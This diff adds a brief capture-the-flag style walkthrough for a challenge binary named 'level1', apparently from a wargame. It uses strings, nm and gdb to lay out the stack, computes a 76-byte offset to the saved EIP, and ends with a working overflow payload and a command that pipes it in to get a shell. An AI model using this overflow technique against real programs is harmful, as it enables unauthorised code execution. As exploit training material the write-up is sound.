@@ -1,0 +1,33 @@
+Always scp the binary to analyse it in Kali.
+
+#> strings level1
+system
+/bin/sh
+
+#> nm -nr level1
+08048480 T main
+08048444 T run
+
+Using gdb's disas:
+main -> has local buffer
+     -> never calls run
+run  -> calls system("/bin/sh")
+
+GOAL: buffer overflow main's local buffer to set pushed EIP to run's address
+
+break after call to gets
+stack: x/24wx $esp
+esp + 0x00 : call arguments
+esp + 0x10 : buffer[64]
+esp + 0x50 : memory allignement
+esp + 0x58 : pushed EBP
+esp + 0x5c : pushed EIP -> GOAL
+
+TARGET: 0x08048444
+OFFSET: 0x5c - 0x10 = 0x4c = 76
+
+SCRIPT: print "A"*76+"\x44\x84\x04\x08"
+
+Send input and stdin enabling new shell to get input:
+#> cat <(python script.py) - | ./level1
+
